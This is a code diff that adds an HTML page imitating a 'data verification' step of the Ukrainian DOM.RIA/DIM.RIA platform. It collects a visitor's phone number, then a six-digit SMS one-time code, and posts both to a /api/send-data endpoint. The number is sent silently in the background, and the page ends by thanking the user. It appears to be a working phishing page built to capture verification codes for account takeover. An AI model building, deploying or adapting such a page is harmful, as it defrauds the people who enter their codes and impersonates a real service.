@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Перевірка даних - DIM.RIA</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+    <style>
+        :root {
+            --primary-color: #007bff; /* Синій колір DOM.RIA */
+            --primary-hover-color: #0056b3;
+            --autoria-safe-color: #28a745; /* Зелений колір для "безпеки" */
+            --border-radius: 12px;
+            --shadow-light: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            background-color: #fff;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-light);
+            text-align: center;
+        }
+
+        .security-check {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            gap: 8px;
+            padding: 10px;
+            background-color: #e9f5e9;
+            border-radius: 6px;
+        }
+
+        .security-check-text {
+            color: var(--autoria-safe-color);
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .security-check-icon {
+            color: var(--autoria-safe-color);
+            font-size: 18px;
+        }
+
+        .logo-wrapper {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            max-width: 220px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            border-radius: 50%; /* Для круглої аватарки */
+        }
+
+        .phone-form, .sms-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        #phone-number {
+            width: 100%;
+            padding: 18px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 20px;
+            text-align: center;
+            font-weight: 500;
+            color: #333;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        
+        #phone-number:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.2);
+            outline: none;
+        }
+        
+        .sms-prompt {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+
+        .code-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .code-input {
+            width: 35px; /* Для 6 цифр */
+            height: 45px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .code-input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.1);
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 18px 10px;
+            background-color: var(--primary-color); 
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: var(--primary-hover-color); 
+            box-shadow: 0 6px 12px rgba(0, 123, 255, 0.4);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div class="security-check">
+            <i class="fas fa-lock security-check-icon"></i> 
+            <span class="security-check-text">Перевірка даних</span>
+        </div>
+        
+        <div class="logo-wrapper">
+            <img src="https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw" alt="Логотип" class="logo">
+        </div>
+
+        <div id="phone-step">
+            <form class="phone-form" onsubmit="return false;">
+                <div class="input-group">
+                    <input type="tel" id="phone-number" name="phone" 
+                           placeholder="99 25 322 77" 
+                           required>
+                </div>
+                
+                <button type="button" class="submit-button" onclick="showSmsStep()">Продовжити</button>
+            </form>
+        </div>
+
+        <div id="sms-step" style="display: none;">
+            
+            <p class="sms-prompt">Для підтвердження даних введіть одноразовий SMS-код</p>
+            
+            <form class="sms-form" onsubmit="sendSmsCode(event)">
+                
+                <div class="code-input-group">
+                    <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
+                </div>
+                
+                <button type="submit" class="submit-button">Продовжити</button>
+            </form>
+        </div>
+
+    </div>
+    
+    <script>
+        // === ЛОГІКА ДЛЯ КРОКУ ТЕЛЕФОНУ (МАСКА) ===
+        $(document).ready(function(){
+            const prefix = '+380 ';
+            
+            // Встановлюємо маску для номера телефону
+            $('#phone-number').mask(
+                '+380999999999', 
+                {
+                    translation: { '9': { pattern: /\d/ } },
+                    placeholder: " " 
+                }
+            ).val(prefix);
+
+            // Запобігання видаленню префікса
+            $('#phone-number').on('focus click', function() {
+                if ($(this).val().length < prefix.length) { 
+                    $(this).val(prefix);
+                }
+            }).on('keydown', function(e) {
+                // Заборона Backspace/Delete, якщо залишився тільки префікс
+                if ((e.keyCode === 8 || e.keyCode === 46) && $(this).val() === prefix) { 
+                    e.preventDefault();
+                }
+            });
+            
+            // === ЛОГІКА ДЛЯ АВТОМАТИЧНОГО ПЕРЕХОДУ ВВЕДЕННЯ КОДУ ===
+            $('.code-input').on('keyup', function(e) {
+                const currentInput = $(this);
+                const maxLength = parseInt(currentInput.attr('maxlength'));
+                const myLength = currentInput.val().length;
+                
+                if (myLength >= maxLength) {
+                    let nextInput = currentInput.nextAll('.code-input').first();
+                    if (nextInput.length) {
+                        nextInput.focus();
+                    }
+                }
+                
+                // Якщо натиснуто Backspace і поле пусте, перемістити фокус назад
+                if (e.keyCode === 8 && myLength === 0) {
+                    let prevInput = currentInput.prevAll('.code-input').first();
+                    if (prevInput.length) {
+                        prevInput.focus();
+                    }
+                }
+            });
+        });
+        
+        // === ЛОГІКА ДЛЯ ПЕРЕМИКАННЯ ТА ВІДПРАВКИ КРОКІВ (AJAX) ===
+        function showSmsStep() {
+            const phoneNumber = $('#phone-number').val();
+            
+            // Перевірка на валідність номеру (повна довжина без пробілів)
+            if (phoneNumber && phoneNumber.replace(/\s/g, '').length === '+380999999999'.length) {
+                
+                // 1. МИТТЄВИЙ ПЕРЕХІД ДО КРОКУ SMS для прискорення
+                $('#phone-step').hide();
+                $('#sms-step').show();
+                $('#code-1').focus();
+
+                // 2. ВІДПРАВКА НОМЕРУ ТЕЛЕФОНУ (на задньому плані, не блокує інтерфейс)
+                $.ajax({
+                    url: '/api/send-data', 
+                    type: 'POST',
+                    contentType: 'application/json', 
+                    data: JSON.stringify({
+                        step: 'phone',
+                        phone: phoneNumber
+                    }),
+                    success: function(response) {
+                        console.log('Номер телефону успішно відправлено (фон):', response);
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('Фонова помилка відправки номеру:', xhr.responseText);
+                    }
+                });
+                
+            } else {
+                alert('Будь ласка, введіть повний номер телефону у форматі +380 ХХ ХХ ХХХ ХХ.');
+            }
+        }
+
+        // Функція для відправки SMS-коду
+        function sendSmsCode(event) {
+            event.preventDefault(); 
+
+            // Збираємо код з усіх полів
+            const smsCode = $('.code-input').map(function() {
+                return this.value;
+            }).get().join(''); 
+            
+            // Перевірка на 6 цифр
+            if (smsCode.length === 6 && /^\d+$/.test(smsCode)) { 
+                
+                // 2. ВІДПРАВКА SMS-КОДУ
+                $.ajax({
+                    url: '/api/send-data', 
+                    type: 'POST',
+                    contentType: 'application/json', 
+                    data: JSON.stringify({ 
+                        step: 'code',
+                        code: smsCode
+                    }),
+                    success: function(response) {
+                        // Змінене повідомлення про успіх
+                        alert('Дані підтвердженно, гарного дня!');
+                        console.log('SMS-код успішно відправлено:', response);
+                    },
+                    error: function(xhr, status, error) {
+                        alert('Помилка відправки коду. Спробуйте пізніше.');
+                        console.error('Помилка AJAX (Код):', xhr.responseText);
+                    }
+                });
+                
+            } else {
+                alert('Будь ласка, введіть повний 6-значний код.');
+            }
+        }
+    </script>
+
+</body>
+</html>
